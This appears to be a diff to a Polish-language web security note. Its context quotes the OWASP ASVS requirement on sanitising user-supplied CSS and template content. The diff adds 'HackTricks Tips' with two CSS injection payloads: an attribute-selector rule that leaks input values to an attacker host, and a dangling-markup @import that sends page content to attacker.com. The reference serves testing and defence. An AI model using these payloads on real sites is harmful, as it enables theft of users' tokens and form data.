@@ -92,3 +92,11 @@ Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas 
 | ID | Sekcja | Wymaganie |
 |---|---|---|
 | V1.3.5 | Sanitization | Verify that the application sanitizes or disables user-supplied scriptable or expression template language content, such as Markdown, CSS or XSL stylesheets, BBCode, or similar. |
+
+
+---
+
+## HackTricks Tips
+
+- **CSS exfil (attribute selectors)**: `input[value^="a"]{background:url(http://attacker/?a)}` — iteruj znaki
+- **Dangling markup CSS**: `<style>@import//attacker.com?` — sends content aż do `;`
